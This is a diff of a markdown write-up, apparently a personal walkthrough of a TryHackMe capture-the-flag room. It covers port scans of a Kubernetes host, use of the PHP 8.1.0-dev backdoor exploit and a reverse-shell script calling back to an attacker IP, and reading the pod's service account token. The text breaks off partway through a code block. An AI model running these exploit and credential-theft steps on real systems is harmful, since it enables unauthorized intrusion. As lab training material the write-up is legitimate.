@@ -13,14 +13,6 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 <p><em>Answer the questions below</em></p>
 
 
-> 1.1. <em><strong>User</strong> flag?</em>
->> <strong>----------------------------</strong><br>
-<br>
-
-> 1.2. <em><strong>Root</strong> flag?</em>
->> <strong>----------------------------</strong><br>
-<br>
-
 <br>
 <br>
 <h1 align="center">Summary</h1>
@@ -32,7 +24,9 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 - Web Interface Inspection<br>
 - Weaponization<br>
 - Delivery and Execution<br>
-- Initial Foothold</p>
+- Initial Foothold<br>
+- <br>
+-</p>
 
 <br>
 <br>
@@ -41,7 +35,7 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 <br>
 
 ```bash
-:~# nmap -p- -sS -sV -sC -T4 -Pn --open 10.201.80.52 -oN full_scan.txt
+:~/FrankandHerbyTryAgain# nmap -p- -sS -sV -sC -T4 -Pn --open xx.xxx.xx.xx -oN full_scan.txt
 ```
 
 <div align="center"><h6>
@@ -60,7 +54,7 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 </h6></div><br>
 
 ```bash
-:~/FrankandHerbyTryAgain# nmap -p- -sS -sV -sC -T4 -Pn --open 10.201.80.52 -oN full_scan.txt
+:~/FrankandHerbyTryAgain# nmap -p- -sS -sV -sC -T4 -Pn --open xx.xxx.xx.xx -oN full_scan.txt
 ...
 PORT      STATE SERVICE     VERSION
 22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
@@ -68,8 +62,8 @@ PORT      STATE SERVICE     VERSION
 |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
 | ssl-cert: Subject: commonName=microk8s@1647797913
 | Subject Alternative Name: DNS:microk8s
-| Not valid before: 2022-03-20T16:38:32
-|_Not valid after:  2023-03-20T16:38:32
+| Not valid before: 2022-03-20Txx:xx:xx
+|_Not valid after:  2023-03-20Txx:xx:xx
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn: 
 |   h2
@@ -88,7 +82,7 @@ PORT      STATE SERVICE     VERSION
 |     Cache-Control: no-cache, private
 |     Content-Type: application/json
 |     X-Content-Type-Options: nosniff
-|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
 |     Content-Length: 185
 |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
 |   HTTPOptions: 
@@ -96,13 +90,13 @@ PORT      STATE SERVICE     VERSION
 |     Cache-Control: no-cache, private
 |     Content-Type: application/json
 |     X-Content-Type-Options: nosniff
-|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
 |     Content-Length: 189
 |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
 | ssl-cert: Subject: commonName=localhost@1759688813
 | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
-| Not valid before: 2025-10-05T17:26:31
-|_Not valid after:  2026-10-05T17:26:31
+| Not valid before: 2025-10-05Txx:xx:xx
+|_Not valid after:  2026-10-05Txx:xx:xx
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn: 
 |   h2
@@ -119,7 +113,7 @@ PORT      STATE SERVICE     VERSION
 |     Cache-Control: no-cache, private
 |     Content-Type: application/json
 |     X-Content-Type-Options: nosniff
-|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
 |     Content-Length: 185
 |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
 |   HTTPOptions: 
@@ -132,8 +126,8 @@ PORT      STATE SERVICE     VERSION
 |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
 | ssl-cert: Subject: commonName=localhost@1759688800
 | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
-| Not valid before: 2025-10-05T17:26:31
-|_Not valid after:  2026-10-05T17:26:31
+| Not valid before: 2025-10-05Txx:xx:xx
+|_Not valid after:  2026-10-05Txx:xx:xx
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn: 
 |   h2
@@ -145,7 +139,7 @@ PORT      STATE SERVICE     VERSION
 |     Audit-Id: 659c389e-6a4a-4843-830a-073c7e3f5d7f
 |     Cache-Control: no-cache, private
 |     Content-Type: application/json
-|     Date: Sun, 05 Oct 2025 18:36:11 GMT
+|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
 |     Content-Length: 129
 |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
 |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
@@ -158,7 +152,7 @@ PORT      STATE SERVICE     VERSION
 |     Audit-Id: cacb6992-aa85-40d1-a22a-4111b51ffcc4
 |     Cache-Control: no-cache, private
 |     Content-Type: application/json
-|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
 |     Content-Length: 129
 |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
 |   HTTPOptions: 
@@ -166,13 +160,13 @@ PORT      STATE SERVICE     VERSION
 |     Audit-Id: 02986f30-4747-4dfe-8d46-4156a859718b
 |     Cache-Control: no-cache, private
 |     Content-Type: application/json
-|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
 |     Content-Length: 129
 |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
 | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
-| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.80.52
-| Not valid before: 2025-10-05T18:25:20
-|_Not valid after:  2026-10-05T18:25:20
+| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:xx.xxx.xx.xx
+| Not valid before: 2025-10-05Txx:xx:xx
+|_Not valid after:  2026-10-05Txx:xx:xx
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn: 
 |   h2
@@ -181,9 +175,9 @@ PORT      STATE SERVICE     VERSION
 |_http-server-header: gunicorn/19.7.1
 |_http-title: 404 Not Found
 | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
-| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.80.52
-| Not valid before: 2025-10-05T18:25:20
-|_Not valid after:  2026-10-05T18:25:20
+| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:xx.xxx.xx.xx
+| Not valid before: 2025-10-05Txx:xx:xx
+|_Not valid after:  2026-10-05Txx:xx:xx
 30679/tcp open  http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
 |_http-title: FRANK RULEZZ!
 ```
@@ -224,24 +218,21 @@ PORT      STATE SERVICE     VERSION
 
 
 ```bash
-:~/FrankandHerbyTryAgain# nikto -h https://10.201.80.52:25000
+:~/FrankandHerbyTryAgain# nikto -h https://xx.xxx.xx.xx:25000
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
-+ Target IP:          10.201.80.52
-+ Target Hostname:    10.201.80.52
++ Target IP:          xx.xxx.xx.xx
++ Target Hostname:    xx.xxx.xx.xx
 + Target Port:        25000
 ---------------------------------------------------------------------------
-+ SSL Info:        Subject: /C=GB/ST=Canonical/L=Canonical/O=Canonical/OU=Canonical/CN=127.0.0.1
-                   Ciphers: TLS_AES_256_GCM_SHA384
-                   Issuer:  /CN=10.152.183.1
-+ Start Time:         2025-10-05 19:40:45 (GMT1)
+...
 ---------------------------------------------------------------------------
 + Server: gunicorn/19.7.1
 + The anti-clickjacking X-Frame-Options header is not present.
 + No CGI Directories found (use '-C all' to force check all possible dirs)
-+ Hostname '10.201.80.52' does not match certificate's CN '127.0.0.1'
++ Hostname 'xx.xxx.xx.xx' does not match certificate's CN '127.0.0.1'
 + 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
-+ End Time:           2025-10-05 19:41:41 (GMT1) (56 seconds)
++ End Time:           2025-10-05 xx:xx:xx (GMT1) (56 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
@@ -258,13 +249,13 @@ PORT      STATE SERVICE     VERSION
 </h6></div>  
 
 ```bash
-:~/FrankandHerbyTryAgain# nikto -h http://10.201.80.52:30679
+:~/FrankandHerbyTryAgain# nikto -h http://xx.xxx.xx.xx:30679
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
-+ Target IP:          10.201.80.52
-+ Target Hostname:    10.201.80.52
++ Target IP:          xx.xxx.xx.xx
++ Target Hostname:    xx.xxx.xx.xx
 + Target Port:        30679
-+ Start Time:         2025-10-05 19:42:19 (GMT1)
++ Start Time:         2025-10-05 xx:xx:xx (GMT1)
 ---------------------------------------------------------------------------
 + Server: No banner retrieved
 + Retrieved x-powered-by header: PHP/8.1.0-dev
@@ -280,7 +271,7 @@ PORT      STATE SERVICE     VERSION
 + OSVDB-18114: /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF:  Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution
 + OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
 + 6544 items checked: 24 error(s) and 11 item(s) reported on remote host
-+ End Time:           2025-10-05 19:43:40 (GMT1) (81 seconds)
++ End Time:           2025-10-05 xx:xx:xx (GMT1) (81 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
@@ -288,37 +279,15 @@ PORT      STATE SERVICE     VERSION
 <br>
 <br>
 <h1 align="center">Directory and File Enumeration</h1>
-
-
-```bash
-:~/FrankandHerbyTryAgain# which feroxbuster
-```
+<p align="center">10255</p>
 
 ```bash
-:~/FrankandHerbyTryAgain# cargo install feroxbuster
-```
-
-```bash
-:~/FrankandHerbyTryAgain# cat /root/FrankandHerbyTryAgain/raft-medium-words-lowercase.txt | head
-```
-
-```bash
-:~/FrankandHerbyTryAgain# feroxbuster -u http://10.201.80.52:10255 -w raft-medium-words-lowercase.txt
-```
-
-
-<h2 align="center">10250</h2>
-
-
-<h2 align="center">10255</h2>
-
-```bash
-:~/FrankandHerbyTryAgain# gobuster dir -u http://10.201.80.52:10255 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -b 400 --exclude-length 48,19
+:~/FrankandHerbyTryAgain# gobuster dir -u http://xx.xxx.xx.xx:10255 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -b 400 --exclude-length 48,19
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.201.80.52:10255
+[+] Url:                     http://xx.xxx.xx.xx:10255
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
@@ -344,69 +313,58 @@ Finished
 ===============================================================
 ```
 
-<h2 align="center">10257</h2>
-
-
-<h2 align="center">10259</h2>
-
-<h2 align="center">16443</h2>
-
-<h2 align="center">25000</h2>
-
-<h2 align="center">30679</h2>
-
 
 ```bash
-:~/FrankandHerbyTryAgain# dirsearch -u https://10.201.80.52:10250/
+:~/FrankandHerbyTryAgain# dirsearch -u https://xx.xxx.xx.xx:10250/
 
   _|. _ _  _  _  _ _|_    v0.4.3.post1
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /root/FrankandHerbyTryAgain/reports/https_10.201.80.52_10250/__25-10-05_20-00-02.txt
+Output File: /root/FrankandHerbyTryAgain/reports/https_xx.xxx.xx.xx_10250/__25-10-05_xx-xx-xx.txt
 
-Target: https://10.201.80.52:10250/
+Target: https://xx.xxx.xx.xx:10250/
 
-[20:00:02] Starting: 
-[20:00:03] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
-[20:00:03] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
-[20:00:28] 401 -   12B  - /attach
-[20:00:29] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
-[20:00:29] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
-[20:00:29] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
-[20:00:32] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
-[20:00:33] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
-[20:00:39] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
-[20:00:39] 401 -   12B  - /debug/pprof/
-[20:00:39] 401 -   12B  - /debug/pprof/profile
-[20:00:39] 401 -   12B  - /debug/pprof/goroutine?debug=1
-[20:00:39] 401 -   12B  - /debug/pprof/heap
-[20:00:39] 401 -   12B  - /debug/pprof/trace
-[20:00:42] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
-[20:00:42] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
-[20:00:44] 401 -   12B  - /exec
-[20:00:44] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
-[20:00:48] 401 -   12B  - /healthz
-[20:00:49] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
-[20:00:58] 401 -   12B  - /logs/access_log
-[20:00:58] 401 -   12B  - /logs/proxy_access_ssl_log
-[20:00:58] 301 -   41B  - /logs  ->  /logs/
-[20:00:58] 401 -   12B  - /logs/errors.log
-[20:00:58] 401 -   12B  - /logs/error_log
-[20:00:58] 401 -   12B  - /logs/liferay.log
-[20:00:58] 401 -   12B  - /logs/www-error.log
-[20:00:58] 401 -   12B  - /logs/access.log
-[20:00:58] 401 -   12B  - /logs/mail.log
-[20:00:58] 401 -   12B  - /logs/
-[20:00:58] 401 -   12B  - /logs/wsadmin.traceout
-[20:00:58] 401 -   12B  - /logs/error.log
-[20:00:58] 401 -   12B  - /logs/proxy_error_log
-[20:01:01] 401 -   12B  - /metrics
-[20:01:13] 401 -   12B  - /pods
-[20:01:19] 401 -   12B  - /run
-[20:01:27] 301 -   42B  - /stats  ->  /stats/
-[20:01:27] 401 -   12B  - /stats/
+[xx:xx:02] Starting: 
+[xx:xx:03] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
+[xx:xx:03] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
+[xx:xx:28] 401 -   12B  - /attach
+[xx:xx:29] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
+[xx:xx:29] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
+[xx:xx:29] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
+[xx:xx:32] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
+[xx:xx:33] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
+[xx:xx:39] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
+[xx:xx:39] 401 -   12B  - /debug/pprof/
+[xx:xx:39] 401 -   12B  - /debug/pprof/profile
+[xx:xx:39] 401 -   12B  - /debug/pprof/goroutine?debug=1
+[xx:xx:39] 401 -   12B  - /debug/pprof/heap
+[xx:xx:39] 401 -   12B  - /debug/pprof/trace
+[xx:xx:42] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
+[xx:xx:42] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
+[xx:xx:44] 401 -   12B  - /exec
+[xx:xx:44] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
+[xx:xx:48] 401 -   12B  - /healthz
+[xx:xx:49] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
+[xx:xx:58] 401 -   12B  - /logs/access_log
+[xx:xx:58] 401 -   12B  - /logs/proxy_access_ssl_log
+[xx:xx:58] 301 -   41B  - /logs  ->  /logs/
+[xx:xx:58] 401 -   12B  - /logs/errors.log
+[xx:xx:58] 401 -   12B  - /logs/error_log
+[xx:xx:58] 401 -   12B  - /logs/liferay.log
+[xx:xx:58] 401 -   12B  - /logs/www-error.log
+[xx:xx:58] 401 -   12B  - /logs/access.log
+[xx:xx:58] 401 -   12B  - /logs/mail.log
+[xx:xx:58] 401 -   12B  - /logs/
+[xx:xx:58] 401 -   12B  - /logs/wsadmin.traceout
+[xx:xx:58] 401 -   12B  - /logs/error.log
+[xx:xx:58] 401 -   12B  - /logs/proxy_error_log
+[xx:xx:01] 401 -   12B  - /metrics
+[xx:xx:13] 401 -   12B  - /pods
+[xx:xx:19] 401 -   12B  - /run
+[xx:xx:27] 301 -   42B  - /stats  ->  /stats/
+[xx:xx:27] 401 -   12B  - /stats/
 
 Task Completed
 ```
@@ -414,32 +372,43 @@ Task Completed
 <br>
 <br>
 <h1 align="center">Web Interface Inspection</h1>
-
-<h2 align="center">10250</h2>
+<p align="center">10250</p>
 
 <img width="1226" height="187" alt="image" src="https://github.com/user-attachments/assets/8798172c-aa7f-48de-9b29-8e0e0271742c" />
 
-
-<h2 align="center">10255</h2>
+<br>
+<br>
+<br>
+<p align="center">10255</p>
 
 <img width="1235" height="304" alt="image" src="https://github.com/user-attachments/assets/c19a830d-5956-4ac6-b215-e24d51d732d9" />
 
+<br>
+<br>
+<br>
+<p>  
+  
+- navigated to xx.xxx.xx.xx:10255/pods<br>
+- identified /var/run/secrets/kubernetes.io/serviceaccount</p>
 
-<h2 align="center">25000</h2>
-
+<img width="1136" height="103" alt="image" src="https://github.com/user-attachments/assets/7edd1cf0-1b61-4f5d-9fda-634c0c2b4367" />
 
 <br>
 <br>
 <br>
-<p>
-    
-- Viewed Page Source</p>
 
-```bash
+<img width="1225" height="420" alt="image" src="https://github.com/user-attachments/assets/0b543189-b54c-40e8-869a-bbe632032a90" />
 
-```
+<br>
+<br>
+<br>
 
-<h2 align="center">30679</h2>
+<img width="1133" height="527" alt="image" src="https://github.com/user-attachments/assets/9c3bcdd7-8879-4d46-b9ee-6f81f7c3b066" />
+
+<br>
+<br>
+<br>
+<p align="center">30679</p>
 
 <img width="936" height="247" alt="image" src="https://github.com/user-attachments/assets/4f702bb7-0012-4c1e-b2f6-e48501897789" />
 
@@ -465,6 +434,7 @@ There is no way they will break in this time!
         <marquee>Because I CONTROL the KUBE! I don't CUDDLE it!</marquee>
 ```
 
+<br>
 <h1 align="center">Weaponization</h1>
 
 
@@ -477,9 +447,9 @@ There is no way they will break in this time!
 ```
 
 ```bash
-~/FrankandHerbyTryAgain# python3 49933.py
+:~/FrankandHerbyTryAgain# python3 49933.py
 Enter the full host url:
-http://10.201.80.52:30679/
+http://xx.xxx.xx.xx:30679/
 ```
 
 ```bash
@@ -493,7 +463,7 @@ uid=0(root) gid=0(root) groups=0(root)
 <p align="center">Downloaded  a repository</p>
 
 ```bash
-:~# git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
+:~/FrankandHerbyTryAgain# git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 ```
 
 ```bash
@@ -504,7 +474,7 @@ backdoor_php_8.1.0-dev.py  docs  README.md  revshell_php_8.1.0-dev.py
 <p align="center">Reverse Shell Listener Setup</p>
 
 ```bash
-:~# nc -nlvp 9001
+:~/FrankandHerbyTryAgain# nc -nlvp 9001
 Listening on 0.0.0.0 9001
 ```
 
@@ -520,7 +490,7 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 <p align="center">Exploit execution</p>
 
 ```bash
-:~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# python3 revshell_php_8.1.0-dev.py http://10.201.80.52:30679 10.201.20.61 9001
+:~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# python3 revshell_php_8.1.0-dev.py http://xx.xxx.xx.xx:30679 xx.xxx.xx.xx 9001
 ```
 
 <br>
@@ -529,15 +499,13 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 
 ```bash
 :~/FrankandHerbyTryAgain# nc -nlvp 9001
-Listening on 0.0.0.0 9001
-Connection received on 10.201.80.52 58192
-bash: cannot set terminal process group (1): Inappropriate ioctl for device
-bash: no job control in this shell
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# 
+...
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# 
 ```
 
+
 ```bash
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls -lah
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ls -lah
 ls -lah
 total 16K
 drwxrwxr-x 2 1000 1000 4.0K Mar 21  2022 .
@@ -547,98 +515,78 @@ drwxr-xr-x 3 root root 4.0K Mar 30  2021 ..
 ```
 
 ```bash
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ip a
-ip a
-1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-    inet6 ::1/128 scope host 
-       valid_lft forever preferred_lft forever
-3: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1440 qdisc noqueue state UP group default 
-    link/ether 5e:41:78:70:d4:f8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
-    inet 10.1.215.65/32 brd 10.1.215.65 scope global eth0
-       valid_lft forever preferred_lft forever
-    inet6 fe80::5c41:78ff:fe70:d4f8/64 scope link 
-       valid_lft forever preferred_lft forever
-```
-
-
-```bash
-root@php-deploy-6d998f68b9-c2fdc:/var/www/html# find / type -name *.io 2>/dev/null
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# find / type -name *.io 2>/dev/null
 <c:/var/www/html# find / type -name *.io 2>/dev/null
 /run/secrets/kubernetes.io
 ```
 
 ```bash
-root@php-deploy-6d998f68b9-c2fdc:/run/secrets# ls -lah
-ls -lah
-total 12K
-drwxr-xr-x 3 root root 4.0K Oct  5 01:46 .
-drwxr-xr-x 1 root root 4.0K Oct  5 01:46 ..
-drwxr-xr-x 3 root root 4.0K Oct  5 01:46 kubernetes.io
+root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io# ls
+ls
+serviceaccount
 ```
 
 ```bash
-root@php-deploy-6d998f68b9-c2fdc:/run/secrets# ls -lah
-ls -lah
-total 12K
-drwxr-xr-x 3 root root 4.0K Oct  5 01:46 .
-drwxr-xr-x 1 root root 4.0K Oct  5 01:46 ..
-drwxr-xr-x 3 root root 4.0K Oct  5 01:46 kubernetes.io
+root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io# cd serviceaccount
+```
+
+```bash      
+root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# ls
+<fvtcg:/run/secrets/kubernetes.io/serviceaccount# ls                        
+ca.crt
+namespace
+token
+```
+
+```bash    
+root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat ca.crt
+<un/secrets/kubernetes.io/serviceaccount# cat ca.crt                        
+-----BEGIN CERTIFICATE-----
+...
+VQvJBsQMENSivG2/9sXsMK35O6ARZ4U0fgH+LJttXG9mMN+DLK7+Pna0mfNjlrc1
+v+ystMEnq13M7jr7YTOfR1lFvg==
+-----END CERTIFICATE-----
+```
+
+```bash   
+:~/FrankandHerbyTryAgain# nano ca.crt
+```
+
+```bash   
+:~/FrankandHerbyTryAgain# chmod 600 ca.crt
+```
+
+```bash      
+root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat token
+<run/secrets/kubernetes.io/serviceaccount# cat token                        
+eyJhbG...
+```
+
+```bash   
+:~/FrankandHerbyTryAgain# token='eyJhbG...'
+```
+
+```bash      
+root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat namespace
 ```
 
 <p>
-
+  
+- there is no microk8s, no curl, no wget, ...<br>
+- downloaded kubectl<br>
+- invested a lot of efftort to upload kubectl unnecessarily<br><br>
 - set up an HTTP server</p>
 
 ```bash
-:~# python3 -m http.server
+:~/FrankandHerbyTryAgain# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 <p>
-    
-- Crafted a File Upload Script</p>
 
-```bash
-echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>'
-```
-
-```bash
-root@php-deploy-6d998f68b9-c2fdc:/var/www/html# echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>' > hi.php
-```
-
-```bash
-:~# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.201.46.77 - - [05/Oct/2025 xx:xx:xx] "GET /kubectl HTTP/1.1." 200 -
-```
-
-<p>
-
-- navigated to :30679/hi.php</p>
-
-```bash
-root@php-deploy-6d998f68b9-c2fdc:/var/www/html# ls -la
-...
--rw-r--r-- 1 root root 49864704 Oct 5  xx:xx kubectl
--rw-r--r-- 1 root root      438 Oct 5  xx:xx hi.php
-```
-
-<p>Web page output:<br>
-
-- <strong>Warning</strong>: Undefined array key "fileToUpload" in <strong>/var/www/html/hi.php</strong> on line <strong>1</strong><br>
-- <strong>Warning</strong>: Trying to access array offset on value of type null in <strong>/var/www/html/hi.php</strong> on line <strong>1</strong><br>
-- <strong>Deprecated</strong>: basename(): Passing null to parameter #1 ($path) of type string is deprecated in <strong>/var/www/html/x.php</strong> on line <strong>1</strong></p>
-
-
-```bash
-root@php-deploy-6d998f68b9-c2fdc:/var/www/html#  exit
-```
-
-
-
+- downloaded kubectl<br>
+- crafted a File Upload Script <code>hi.php</code><br>
+- discovered it here: https://www.w3schools.com/php/php_file_upload.asp</p>
 
 ```bash
 :~/FrankandHerbyTryAgain# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
@@ -649,299 +597,335 @@ root@php-deploy-6d998f68b9-c2fdc:/var/www/html#  exit
 ```
 
 ```bash
-<?php;$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) {    echo "File is an image - " . $check["mime"] . ".";    $uploadOk = 1;  } else {    echo "File is not an image.";    $uploadOk = 0;  }}?>
